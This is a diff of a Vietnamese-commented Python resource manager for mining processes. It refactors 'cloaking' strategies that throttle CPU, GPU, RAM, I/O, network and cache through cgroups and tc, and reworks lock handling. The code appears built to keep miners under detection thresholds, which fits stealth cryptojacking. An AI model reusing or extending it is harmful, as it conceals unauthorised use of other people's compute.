@@ -5,15 +5,15 @@ import logging
 import psutil
 import pynvml
 import traceback
-from time import sleep, time
-from datetime import datetime, timedelta, timezone
-from pathlib import Path
+import subprocess
+from time import sleep
+from typing import List, Any, Dict, Optional, Tuple
 from queue import PriorityQueue, Empty, Queue
-from threading import Event, Thread, Lock
-from typing import List, Any, Dict, Optional
-from readerwriterlock import rwlock
+from threading import Event, Lock
+from concurrent.futures import ThreadPoolExecutor
 from itertools import count
-from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from readerwriterlock import rwlock
 
 # Import các module phụ trợ từ dự án
 from .base_manager import BaseManager
@@ -39,8 +39,6 @@ from .auxiliary_modules.power_management import (
     set_gpu_usage,
     shutdown_power_management
 )
-
-
 
 
 class SharedResourceManager:
@@ -165,7 +163,7 @@ class SharedResourceManager:
 
     def restore_resources(self, process: MiningProcess):
         """
-        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách xóa các cgroup liên quan và thiết lập lại các giới hạn tài nguyên.
+        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách sử dụng các chiến lược cloaking để khôi phục các giới hạn tài nguyên.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình khai thác.
@@ -181,82 +179,22 @@ class SharedResourceManager:
                 return
 
             # Khôi phục các giới hạn tài nguyên từ original_resource_limits
-            # 1. CPU Cloak
-            if 'cpu_cloak' in orig_limits:
-                cpu_info = orig_limits['cpu_cloak']
-                self.adjust_cpu_threads(pid, cpu_info['cpu_threads'], name)
-                self.cgroup_manager.delete_cgroup(cpu_info['cgroup'], controllers='cpu')
-                self.cgroup_manager.delete_cgroup(f"cpuset_cloak_{pid}", controllers='cpuset')
-                self.logger.info(f"Đã khôi phục CPU threads và xóa cgroup CPU cho {name} (PID={pid}).")
-
-            # 2. RAM Cloak
-            if 'ram_cloak' in orig_limits:
-                ram_info = orig_limits['ram_cloak']
-                self.adjust_ram_allocation(pid, ram_info['ram_allocation_mb'], name)
-                self.cgroup_manager.delete_cgroup(f"ram_cloak_{pid}", controllers='memory')
-                self.logger.info(f"Đã khôi phục RAM allocation và xóa cgroup RAM cho {name} (PID={pid}).")
-
-            # 3. GPU Cloak
-            if 'gpu_cloak' in orig_limits:
-                gpu_info = orig_limits['gpu_cloak']
-                self.adjust_gpu_power_limit(pid, gpu_info['gpu_power_limit'], name)
-                self.cgroup_manager.delete_cgroup(f"gpu_cloak_{pid}", controllers='gpu')
-                self.logger.info(f"Đã khôi phục GPU power limit và xóa cgroup GPU cho {name} (PID={pid}).")
-
-            # 4. Ionice Cloak
-            if 'ionice_cloak' in orig_limits:
-                ionice_info = orig_limits['ionice_cloak']
-                self.adjust_disk_io_priority(pid, ionice_info['ionice_class'], name)
-                self.cgroup_manager.delete_cgroup(f"ionice_cloak_{pid}", controllers='blkio')
-                self.logger.info(f"Đã khôi phục Ionice class và xóa cgroup Disk I/O cho {name} (PID={pid}).")
-
-            # 5. Network Cloak
-            if 'network_cloak' in orig_limits:
-                network_info = orig_limits['network_cloak']
-                self.adjust_network_bandwidth(process, network_info['network_bandwidth_limit_mbps'])
-                self.cgroup_manager.delete_cgroup(f"network_cloak_{pid}", controllers='net_cls,net_prio')
-                self.logger.info(f"Đã khôi phục Network bandwidth và xóa cgroup Network cho {name} (PID={pid}).")
-
-            # 6. Cache Cloak
-            if 'cache_cloak' in orig_limits:
-                cache_info = orig_limits['cache_cloak']
-                self.adjust_cache_limit(pid, cache_info['cache_limit_percent'], name)
-                self.cgroup_manager.delete_cgroup(f"cache_cloak_{pid}", controllers='cache')
-                self.logger.info(f"Đã khôi phục Cache limit và xóa cgroup Cache cho {name} (PID={pid}).")
-
-            # Xóa các cgroup liên quan đã được liệt kê trước đó nếu vẫn còn tồn tại
-            cgroups_to_delete = [
-                f"cpu_cloak_{pid}",
-                f"gpu_cloak_{pid}",
-                f"network_cloak_{pid}",
-                f"disk_io_cloak_{pid}",
-                f"cache_cloak_{pid}",
-                f"cpuset_cloak_{pid}",
-                f"ionice_cloak_{pid}"
-            ]
-
-            for cgroup in cgroups_to_delete:
-                controllers = ''
-                if 'cpu_cloak' in cgroup or 'cpu' in cgroup:
-                    controllers = 'cpu'
-                elif 'gpu_cloak' in cgroup or 'gpu' in cgroup:
-                    controllers = 'gpu'
-                elif 'network_cloak' in cgroup or 'network' in cgroup:
-                    controllers = 'net_cls,net_prio'
-                elif 'disk_io_cloak' in cgroup or 'ionice' in cgroup:
-                    controllers = 'blkio'
-                elif 'cache_cloak' in cgroup or 'cache' in cgroup:
-                    controllers = 'cache'
-                elif 'cpuset_cloak' in cgroup or 'cpuset' in cgroup:
-                    controllers = 'cpuset'
-                else:
-                    self.logger.warning(f"Không xác định controller cho cgroup '{cgroup}'.")
-                    continue
-
-                # Xóa cgroup nếu nó vẫn tồn tại
-                self.cgroup_manager.delete_cgroup(cgroup, controllers=controllers)
-                self.logger.info(f"Đã xóa cgroup '{cgroup}' cho tiến trình {name} (PID={pid}).")
-
+            for strategy_name, limits in orig_limits.items():
+                if strategy_name.endswith('_cloak'):
+                    strategy_key = strategy_name.split('_')[0]  # 'cpu', 'ram', etc.
+                    strategy = CloakStrategyFactory.create_strategy(
+                        strategy_key,
+                        self.config,
+                        self.logger,
+                        self.cgroup_manager,          
+                        self.is_gpu_initialized()    
+                    )
+                    if strategy and callable(getattr(strategy, 'restore', None)):
+                        self.logger.info(f"Khôi phục chiến lược '{strategy_key}' cho {name} (PID: {pid})")
+                        strategy.restore(process, limits)
+                    else:
+                        self.logger.error(f"Không thể khôi phục chiến lược '{strategy_key}' cho {name} (PID: {pid})")
+            
             # Xóa trạng thái ban đầu
             del self.original_resource_limits[pid]
             self.logger.info(
@@ -268,229 +206,6 @@ class SharedResourceManager:
             )
             raise
 
-
-
-    def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str, unit: str = 'W') -> bool:
-        """
-        Điều chỉnh giới hạn power của GPU cho tiến trình.
-
-        Args:
-            pid (int): PID của tiến trình.
-            power_limit (int): Giới hạn power cần đặt.
-            process_name (str): Tên của tiến trình.
-            unit (str, optional): Đơn vị của power_limit ('W' hoặc 'mW'). Defaults to 'W'.
-
-        Returns:
-            bool: True nếu điều chỉnh thành công, ngược lại False.
-        """
-        self.logger.debug(f"Adjusting GPU power limit for PID={pid}, power_limit={power_limit}, unit={unit}")
-        if not self.gpu_manager.gpu_initialized:
-            self.logger.error("GPUManager chưa được khởi tạo. Không thể điều chỉnh GPU power limit.")
-            return False
-
-        try:
-            gpu_index = 0  # Giả sử sử dụng GPU đầu tiên. Có thể mở rộng để chọn GPU dựa trên PID hoặc logic khác.
-            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
-
-            if unit.lower() == 'mw':
-                power_limit_mw = power_limit
-            elif unit.lower() == 'w':
-                power_limit_mw = power_limit * 1000
-            else:
-                raise ValueError(f"Đơn vị không hợp lệ: {unit}. Chỉ hỗ trợ 'W' và 'mW'.")
-
-            self.logger.debug(f"Converted power_limit to mW: {power_limit_mw} mW")
-            min_limit, max_limit = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)
-            self.logger.debug(f"GPU power limit constraints: min={min_limit} mW, max={max_limit} mW")
-
-            if not (min_limit <= power_limit_mw <= max_limit):
-                raise ValueError(
-                    f"Power limit {power_limit}{unit} không hợp lệ. "
-                    f"Khoảng hợp lệ: {min_limit // 1000}W - {max_limit // 1000}W."
-                )
-
-            # Sử dụng CgroupManager để thiết lập power limit nếu có phương thức phù hợp
-            # Tuy nhiên, trong CgroupManager hiện tại chưa hỗ trợ power limit, nên vẫn sử dụng GPUManager trực tiếp
-            # Đảm bảo rằng GPUManager đã được tích hợp đúng cách
-
-            self.gpu_manager.set_gpu_power_limit(gpu_index, power_limit_mw // 1000)  # Chuyển từ mW sang W
-            self.logger.info(
-                f"Set GPU power limit={power_limit}{unit} cho {process_name} (PID: {pid})."
-            )
-            return True
-        except pynvml.NVMLError as e:
-            self.logger.error(
-                f"Lỗi NVML khi set GPU power limit cho {process_name} (PID={pid}): {e}. "
-                f"Power limit yêu cầu: {power_limit}{unit}."
-            )
-        except ValueError as ve:
-            self.logger.error(f"Lỗi giá trị power limit: {ve}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi không xác định khi set GPU power limit cho {process_name} (PID={pid}): {e}."
-            )
-
-        return False
-
-    def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
-        """
-        Điều chỉnh độ ưu tiên Disk I/O cho tiến trình bằng ionice.
-
-        Args:
-            pid (int): PID của tiến trình.
-            ionice_class (int): Lớp ionice (1: realtime, 2: best-effort, 3: idle).
-            process_name (str): Tên của tiến trình.
-        """
-        try:
-            # Sử dụng CgroupManager để thao tác với cgroup disk_io nếu cần
-            # Tuy nhiên, ionice là một công cụ ngoài cgroup, nên vẫn sử dụng subprocess
-            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
-            self.logger.info(
-                f"Set ionice class={ionice_class} cho tiến trình {process_name} (PID={pid})."
-            )
-        except subprocess.CalledProcessError as e:
-            self.logger.error(f"Lỗi chạy ionice: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi adjust_disk_io_priority cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
-            )
-
-    def drop_caches(self):
-        """
-        Drop caches của hệ thống để giảm sử dụng cache.
-        """
-        try:
-            with open('/proc/sys/vm/drop_caches', 'w') as f:
-                f.write('3\n')
-            self.logger.info("Đã drop caches.")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi drop_caches: {e}\n{traceback.format_exc()}"
-            )
-
-    def adjust_cache_limit(self, pid: int, cache_limit_percent: float, process_name: str):
-        """
-        Điều chỉnh giới hạn cache cho tiến trình.
-
-        Args:
-            pid (int): PID của tiến trình.
-            cache_limit_percent (float): Giới hạn cache theo phần trăm.
-            process_name (str): Tên của tiến trình.
-        """
-        try:
-            # Giả sử sử dụng cgroups để giới hạn cache (cần thiết lập cgroups phù hợp trước)
-            # Đây chỉ là một ví dụ, bạn cần điều chỉnh phù hợp với hệ thống của mình
-            # Ví dụ: giới hạn cache bằng cách ghi vào file cgroup
-            cgroup_path = f"/sys/fs/cgroup/cache/{pid}"
-            if not Path(cgroup_path).exists():
-                self.logger.warning(f"Cgroup cho PID={pid} không tồn tại. Bỏ qua điều chỉnh cache.")
-                return
-
-            # Giả sử 'cache.max' là file cấu hình để giới hạn cache
-            cache_limit_bytes = int(cache_limit_percent / 100 * self.get_total_cache())
-            self.cgroup_manager.set_cgroup_parameter(
-                'cache_cgroup', 'cache.max', str(cache_limit_bytes), controllers='cache'
-            )
-            
-            self.logger.info(
-                f"Đã điều chỉnh giới hạn cache thành {cache_limit_percent}% ({cache_limit_bytes} bytes) cho tiến trình {process_name} (PID: {pid})."
-            )
-        except FileNotFoundError:
-            self.logger.error(f"Không tìm thấy cgroup cache cho PID={pid}.")
-        except PermissionError:
-            self.logger.error(f"Không đủ quyền để điều chỉnh cache cho PID={pid}.")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi adjust_cache_limit cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
-            )
-
-    def get_total_cache(self) -> int:
-        """
-        Lấy tổng lượng cache hiện có trên hệ thống.
-
-        Returns:
-            int: Tổng cache tính bằng bytes.
-        """
-        # Ví dụ: giả sử tổng cache là 8GB
-        return 8 * 1024 * 1024 * 1024  # 8GB in bytes
-
-    def get_process_cache_usage(self, pid: int) -> float:
-        """
-        Lấy usage cache của tiến trình.
-
-        Args:
-            pid (int): PID của tiến trình.
-
-        Returns:
-            float: Cache usage phần trăm.
-        """
-        try:
-            # Cách lấy cache usage có thể khác nhau tùy vào hệ điều hành
-            # Dưới đây là một ví dụ giả định sử dụng /proc/[pid]/status (chỉ dành cho Linux)
-            with open(f"/proc/{pid}/status", 'r') as f:
-                for line in f:
-                    if line.startswith("VmCache:"):
-                        cache_kb = int(line.split()[1])
-                        total_mem_kb = psutil.virtual_memory().total / 1024
-                        cache_percent = (cache_kb / total_mem_kb) * 100
-                        return cache_percent
-            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
-            return 0.0
-        except FileNotFoundError:
-            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
-            return 0.0
-        except Exception as e:
-            self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
-            return 0.0
-
-    def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
-        """
-        Áp dụng cloaking mạng cho tiến trình bằng cách cấu hình giao diện mạng.
-
-        Args:
-            interface (str): Tên giao diện mạng.
-            bandwidth_limit (float): Giới hạn băng thông (Mbps).
-            process (MiningProcess): Đối tượng tiến trình khai thác.
-        """
-        try:
-            self.configure_network_interface(interface, bandwidth_limit)
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi network cloaking cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def configure_network_interface(self, interface: str, bandwidth_limit: float):
-        """
-        Cấu hình giao diện mạng để giới hạn băng thông.
-
-        Args:
-            interface (str): Tên giao diện mạng.
-            bandwidth_limit (float): Giới hạn băng thông (Mbps).
-        """
-        try:
-            # Sử dụng `tc` để giới hạn băng thông mạng
-            # Giả sử `tc` đã được cài đặt và cấu hình đúng cách trên hệ thống
-            # Reset các qdisc hiện tại
-            subprocess.run(['tc', 'qdisc', 'del', 'dev', interface, 'root'], check=False, stderr=subprocess.DEVNULL)
-            # Thiết lập limit băng thông
-            subprocess.run([
-                'tc', 'qdisc', 'add', 'dev', interface, 'root', 'handle', '1:0',
-                'htb', 'default', '30'
-            ], check=True)
-            subprocess.run([
-                'tc', 'class', 'add', 'dev', interface, 'parent', '1:0',
-                'classid', '1:1', 'htb', 'rate', f'{bandwidth_limit}Mbps'
-            ], check=True)
-            self.logger.info(
-                f"Đã cấu hình giới hạn băng thông mạng cho giao diện {interface} thành {bandwidth_limit} Mbps."
-            )
-        except subprocess.CalledProcessError as e:
-            self.logger.error(f"Lỗi cấu hình network interface {interface} với tc: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi configure_network_interface cho {interface}: {e}\n{traceback.format_exc()}"
-            )
 
 class ResourceManager(BaseManager):
     """
@@ -604,6 +319,50 @@ class ResourceManager(BaseManager):
         except Exception as e:
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
 
+    def acquire_write_lock(self, lock: rwlock.RWLockFairWriteLock, timeout: Optional[float] = None) -> bool:
+        """
+        Tiện ích để chiếm write lock với timeout.
+
+        Args:
+            lock (rwlock.RWLockFairWriteLock): Write lock cần chiếm.
+            timeout (Optional[float], optional): Thời gian chờ (giây). Defaults to None.
+
+        Returns:
+            bool: True nếu chiếm thành công, False nếu timeout.
+        """
+        try:
+            acquired = lock.acquire(timeout=timeout)
+            if acquired:
+                self.logger.debug("Acquired write lock successfully.")
+            else:
+                self.logger.warning("Failed to acquire write lock: timeout.")
+            return acquired
+        except Exception as e:
+            self.logger.error(f"Lỗi khi acquire_write_lock: {e}\n{traceback.format_exc()}")
+            return False
+
+    def acquire_read_lock(self, lock: rwlock.RWLockFairReadLock, timeout: Optional[float] = None) -> bool:
+        """
+        Tiện ích để chiếm read lock với timeout.
+
+        Args:
+            lock (rwlock.RWLockFairReadLock): Read lock cần chiếm.
+            timeout (Optional[float], optional): Thời gian chờ (giây). Defaults to None.
+
+        Returns:
+            bool: True nếu chiếm thành công, False nếu timeout.
+        """
+        try:
+            acquired = lock.acquire(timeout=timeout)
+            if acquired:
+                self.logger.debug("Acquired read lock successfully.")
+            else:
+                self.logger.warning("Failed to acquire read lock: timeout.")
+            return acquired
+        except Exception as e:
+            self.logger.error(f"Lỗi khi acquire_read_lock: {e}\n{traceback.format_exc()}")
+            return False
+
     def discover_mining_processes(self):
         """
         Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
@@ -612,11 +371,13 @@ class ResourceManager(BaseManager):
             cpu_name = self.config['processes'].get('CPU', '').lower()
             gpu_name = self.config['processes'].get('GPU', '').lower()
 
-            with self.mining_processes_lock.gen_wlock(timeout=5) as resource_lock_acquired:
-                if not resource_lock_acquired:
-                    self.logger.error("Timeout khi acquire mining_processes_lock trong discover_mining_processes.")
-                    return
+            write_lock = self.mining_processes_lock.gen_wlock()
+            acquired = write_lock.acquire(timeout=5)
+            if not acquired:
+                self.logger.error("Timeout khi acquire mining_processes_lock trong discover_mining_processes.")
+                return
 
+            try:
                 self.mining_processes.clear()
                 for proc in psutil.process_iter(['pid', 'name']):
                     pname = proc.info['name'].lower()
@@ -630,6 +391,8 @@ class ResourceManager(BaseManager):
                 self.logger.info(
                     f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
                 )
+            finally:
+                write_lock.release()
         except Exception as e:
             self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")
 
@@ -701,7 +464,7 @@ class ResourceManager(BaseManager):
             except Exception as e:
                 self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")
 
-            # 6) Nghỉ theo chu kỳ lớn nhất (mặc định 10 giây)
+            # 6) Nghỉ theo chu kỳ lớn nhất (mặc định 60 giây)
             sleep(max(temp_intv, power_intv))
 
     def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
@@ -794,17 +557,22 @@ class ResourceManager(BaseManager):
         Phân bổ tài nguyên cho các tiến trình khai thác theo thứ tự ưu tiên.
         """
         try:
-            # Acquire locks theo thứ tự: resource_lock trước, mining_processes_lock sau
-            with self.resource_lock.gen_wlock(timeout=5) as resource_lock_acquired:
-                if not resource_lock_acquired:
-                    self.logger.error("Timeout khi acquire resource_lock trong allocate_resources_with_priority.")
+            # Acquire write lock với timeout
+            write_lock = self.resource_lock.gen_wlock()
+            acquired = write_lock.acquire(timeout=5)
+            if not acquired:
+                self.logger.error("Timeout khi acquire resource_lock trong allocate_resources_with_priority.")
+                return
+
+            try:
+                # Acquire read lock với timeout
+                read_lock = self.mining_processes_lock.gen_rlock()
+                acquired_read = read_lock.acquire(timeout=5)
+                if not acquired_read:
+                    self.logger.error("Timeout khi acquire mining_processes_lock trong allocate_resources_with_priority.")
                     return
 
-                with self.mining_processes_lock.gen_rlock(timeout=5) as mining_lock_acquired:
-                    if not mining_lock_acquired:
-                        self.logger.error("Timeout khi acquire mining_processes_lock trong allocate_resources_with_priority.")
-                        return
-
+                try:
                     # Sắp xếp các tiến trình theo độ ưu tiên giảm dần
                     sorted_procs = sorted(
                         self.mining_processes,
@@ -848,6 +616,10 @@ class ResourceManager(BaseManager):
                         ))
                         
                         allocated += proc.priority
+                finally:
+                    read_lock.release()
+            finally:
+                write_lock.release()
         except Exception as e:
             self.logger.error(
                 f"Lỗi allocate_resources_with_priority: {e}\n{traceback.format_exc()}"
@@ -941,8 +713,8 @@ class ResourceManager(BaseManager):
                                     .get('network', {})
                                     .get('bandwidth_limit_mbps', 100.0))  # Đảm bảo là float
             
-            # Lấy metrics cache từ shared_resource_manager
-            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid)
+            # Lấy metrics cache thông qua SharedResourceManager
+            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if hasattr(self.shared_resource_manager, 'get_process_cache_usage') else 0.0
 
             metrics = {
                 'cpu_usage_percent': float(cpu_pct),
@@ -979,11 +751,13 @@ class ResourceManager(BaseManager):
         """
         metrics_data = {}
         try:
-            with self.mining_processes_lock.gen_rlock(timeout=5) as mining_lock_acquired:
-                if not mining_lock_acquired:
-                    self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
-                    return metrics_data
+            read_lock = self.mining_processes_lock.gen_rlock()
+            acquired_read = read_lock.acquire(timeout=5)
+            if not acquired_read:
+                self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
+                return metrics_data
 
+            try:
                 for proc in self.mining_processes:
                     metrics = self.collect_metrics(proc)
                     if not isinstance(metrics, dict):
@@ -999,12 +773,12 @@ class ResourceManager(BaseManager):
                         )
                         continue  # Bỏ qua PID này
                     metrics_data[str(proc.pid)] = metrics
-            self.logger.debug(f"Collected metrics data: {metrics_data}")
+                self.logger.debug(f"Collected metrics data: {metrics_data}")
+            finally:
+                read_lock.release()
         except Exception as e:
             self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
         return metrics_data
-
-    # Loại bỏ phương thức apply_recommended_action và các tham chiếu đến OpenAI
 
     def shutdown(self):
         """
